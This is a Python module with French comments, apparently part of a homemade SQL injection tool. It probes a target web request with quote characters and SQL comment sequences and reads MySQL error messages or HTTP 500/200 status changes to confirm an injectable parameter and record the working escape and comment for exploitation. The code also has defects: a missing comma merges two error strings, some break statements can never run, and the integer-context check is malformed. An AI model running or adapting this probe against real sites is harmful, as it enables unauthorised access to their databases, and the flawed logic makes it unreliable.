#coding:utf-8

'''

- Ajouter la détection par BOOLEAN BASED
- Ajouter des explications

+ La detection marche que si la cible 
  génere des erreurs ou un code HTTP 500

'''


from req_ import req
from re import search

def getConf(body, config):

	badChar = [
		'\'',
		'"'
	]

	comment = [
		'%23',
		'-- -',
		'--+',
	]

	MySQL = [
		'You have an error in your SQL syntax',
		'Warning: mysql_fetch_array()',
		'Warning: mysqli_fetch_array()'
		'<b>Warning</b>:  mysql_num_rows()'
	]


	err_ = ''
	char_ = ''


	# Détection basée sur les messages d'erreurs (STRING context only)

	# On regarde quel caractère déjà génére une erreur
	for char in badChar:
			rep = req(body, char)

			# recherche d'erreurs ...
			for err in MySQL:
				# confirmation de la vulnérabilité
				if err in rep['body']:

					# Récupération du caractère qui échappe la requête
					char_ = char
					err_ = err

					# On recherche le commentaire qui ferme la bonne requête
					for com in comment:
						rep = req(body, char_ + com)
						# Si il n'y a pas d'erreur le payload est valide
						if err not in rep['body']:

							config['dbms'] = 'MySQL'
							config['escape'] = char_
							config['comment'] = com
							config['detection'] = 'errorBased'

							return True
							break

	# Déction basée sur le code HTTP

	for char in badChar:
		for com in comment:
			rep = req(body, char)# Ne pas mettre de commetaire à la fin !
			rep2 = req(body, char + char + com)

			if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

				config['escape'] = char
				config['comment'] = com

				return True
				break
				
	# Comparaison pour integer context
	
	for com in comment:
		
		rep = req(body, '\'')# On génére un code 500 en premier
		rep2 = req(body, '' + com)# Attention peut générer des faux résultats 

		if search(r'^5', rep['code']) and search(r'^2', rep2['code']):

			config['comment'] = com
			config['detection'] = 'codeBased'

			return True	
		
